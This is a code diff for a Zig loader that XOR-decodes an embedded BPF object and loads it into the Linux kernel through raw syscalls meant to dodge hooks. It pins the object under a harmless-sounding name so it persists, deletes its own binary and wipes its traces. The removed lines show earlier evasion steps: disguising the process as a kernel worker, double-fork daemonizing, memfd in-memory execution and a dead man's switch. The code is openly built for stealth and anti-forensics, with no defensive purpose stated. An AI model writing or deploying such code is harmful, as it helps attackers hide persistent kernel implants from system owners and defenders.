@@ -1,46 +1,31 @@
 const std = @import("std");
 const syscalls = @import("syscalls.zig");
 
-const K: u8 = 0x5F; // XOR Key
-const HEARTBEAT_TIMEOUT: i64 = 86400; // 24 Hours
+const BPF_OBJ_PIN: u32 = 6;
+const BPF_PROG_LOAD: u32 = 5;
 
 pub fn main() !void {
-    // 1. Process Masking
-    const mask_name = "kworker/u11:1-events";
-    _ = syscalls.prctl(15, @intFromPtr(mask_name), 0, 0, 0);
+    // 1. Decrypt Soul (BPF Bytecode)
+    var bpf_blob = @constCast(@embedFile("../target/ghost_gate.bpf.o").*);
+    for (&bpf_blob) |*b| { b.* ^= 0x5F; }
 
-    // 2. Double-Fork (Daemonize)
-    const pid1 = std.os.linux.fork();
-    if (pid1 != 0) std.os.exit(0);
-    _ = std.os.linux.setsid();
-    const pid2 = std.os.linux.fork();
-    if (pid2 != 0) std.os.exit(0);
+    // 2. Load into Kernel
+    // We use raw syscalls to avoid libc/std hooks
+    const prog_fd = syscalls.bpf_call(BPF_PROG_LOAD, &bpf_blob, bpf_blob.len);
+    if (prog_fd < 0) std.os.exit(1);
 
-    // 3. Instruction Polarity: Un-XOR the embedded BPF
-    var bpf_blob = @constCast(@embedFile("../target/vfs_cache.bpf.o").*);
-    for (&bpf_blob) |*b| { b.* ^= K; }
+    // 3. Pin to Virtual Filesystem (The "Vanishing Act")
+    // Pinned programs stay active even after this process dies
+    const pin_path = "/sys/fs/bpf/net_sync_provider";
+    _ = syscalls.bpf_obj_pin(@intCast(prog_fd), pin_path);
 
-    // 4. memfd_create + fexecve (Sign-less execution)
-    const fd = syscalls.memfd_create("sys_vfs_sync", 1); // MFD_CLOEXEC
-    _ = std.os.linux.write(@intCast(fd), &bpf_blob);
-
-    // 5. Dead Man's Switch Check
-    var last_heartbeat = std.time.timestamp();
-
-    // 6. Ghost Execution Logic
-    // In production, fexecve would point to the secondary engine
-    const args = [_:null]?[*:0]u8{ @ptrCast(mask_name), null };
-    const env = [_:null]?[*:0]u8{ null };
-    
-    // Self-Delete Trigger
+    // 4. Self-Destruct Traces
     var buf: [1024]u8 = undefined;
-    const self_path = try std.os.readlink("/proc/self/exe", &buf);
-    _ = std.os.linux.unlink(self_path);
+    if (std.os.readlink("/proc/self/exe", &buf)) |path| {
+        _ = std.os.linux.unlink(path);
+    } else |_| {}
 
-    while (true) {
-        if (std.time.timestamp() - last_heartbeat > HEARTBEAT_TIMEOUT) {
-            std.os.exit(0); // Terminate and let memory be reclaimed
-        }
-        std.time.sleep(60 * std.time.ns_per_s);
-    }
+    // 5. Hard Exit
+    @memset(&bpf_blob, 0);
+    std.os.exit(0);
 }
